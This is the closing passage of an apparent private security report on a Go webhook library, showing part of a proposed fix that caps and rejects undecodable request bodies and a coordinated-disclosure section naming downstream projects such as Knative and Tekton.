    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

This propagates a fix to **every downstream consumer** with no API change, and the cap can be made configurable per-server via a new field on the `webhook.Options` struct.

# Disclosure

Reporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.
